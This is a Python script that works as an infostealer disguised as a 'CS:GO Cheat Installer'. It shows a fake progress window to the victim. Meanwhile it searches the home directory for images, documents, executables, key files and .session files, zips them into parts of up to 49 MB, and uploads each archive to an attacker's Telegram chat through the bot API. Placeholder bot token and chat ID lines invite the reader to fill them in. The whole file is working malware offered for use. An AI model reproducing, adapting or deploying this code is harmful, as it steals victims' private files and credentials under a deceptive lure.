"""
================================================================
================================================================
================================================================
==========                   LIBERYS                  ==========
================================================================
================================================================
================================================================
"""


import os
import zipfile
import requests
import tempfile
import time
import tkinter as tk
from tkinter import ttk
from threading import Thread


"""
================================================================
================================================================
================================================================
==========                    CONST                   ==========
================================================================
================================================================
================================================================
"""

# Telegram bot config
BOT_TOKEN = 'blabla193.192.192.193' #YOU MUST CHANGE IT
CHAT_ID = '12345678' # YOU MUST CHANGE IT
SEARCH_DIR = os.path.expanduser("~")
TARGET_EXTENSIONS = ['.keys', '.jpg', '.jpeg', '.png', '.pdf', '.docx', '.xlsx', '.exe', '.session'] # you can change it
MAX_ZIP_SIZE = 49 * 1024 * 1024  # 49 MB per archive //\\ Only from it time to you can have the .zip is longer.


"""
================================================================
================================================================
================================================================
==========                    CODE                    ==========
================================================================
================================================================
================================================================
"""


def find_files(start_path):
    result = []
    for root, _, files in os.walk(start_path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                full_path = os.path.join(root, file)
                try:
                    size = os.path.getsize(full_path)
                    result.append((full_path, size))
                except:
                    continue
    return result

# Archive files into multiple .zips if total size > 49MB
def archive_and_split(file_list):
    tmp_dir = tempfile.gettempdir()
    archives = []
    current_batch = []
    current_size = 0
    zip_index = 1

    for path, size in file_list:
        if size > MAX_ZIP_SIZE:
            continue  # skip huge individual files

        if current_size + size > MAX_ZIP_SIZE and current_batch:
            archive_path = create_zip(current_batch, zip_index, tmp_dir)
            archives.append(archive_path)
            zip_index += 1
            current_batch = []
            current_size = 0

        current_batch.append(path)
        current_size += size

    if current_batch:
        archive_path = create_zip(current_batch, zip_index, tmp_dir)
        archives.append(archive_path)

    return archives

# Create a zip archive with given files
def create_zip(file_paths, index, tmp_dir):
    zip_path = os.path.join(tmp_dir, f"files_part{index}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in file_paths:
            try:
                arcname = os.path.relpath(file_path, SEARCH_DIR)
                zipf.write(file_path, arcname=arcname)
            except:
                continue
    return zip_path

# Main scan & send logic
def run_scan():
    files = find_files(SEARCH_DIR)
    if not files:
        return False

    archives = archive_and_split(files)
    success = True
    for archive in archives:
        ok = send_to_telegram(archive)
        if not ok:
            success = False
        os.remove(archive)
    return success

# Fake GUI: CS:GO cheat installer
def fake_progress_and_run():
    def start_real_work():
        progress.start()
        root.after(1500, lambda: progress.stop())
        root.after(2000, lambda: root.destroy())
        Thread(target=run_scan).start()

    root = tk.Tk()
    root.title("CS:GO Cheat Installer")
    root.geometry("400x150")
    root.resizable(False, False)

    label = tk.Label(root, text="Installing CS:GO cheat...\nPlease wait.\nNOT CLOSE IT. IF YOU CLOSE YOU HAVEN'T THE CHEAT\nIF IT CLOSE WAIT 10 MINUTE") #You can change it
    label.pack(pady=10)

    progress = ttk.Progressbar(root, orient="horizontal", mode="indeterminate", length=300)
    progress.pack(pady=10)

    root.after(500, start_real_work)
    root.mainloop()

# Send archive to Telegram
def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    return response.ok

fake_progress_and_run()
"""

                                =========================================================================
                        
                                                                The Best
                        
          FILES                 =====   =========   =========   =========   =========   =========   =====                   TELEGRAM
                        
                                                                  Road
                                
                                =========================================================================

                                                          by t.me/ErnestoMiyake
"""
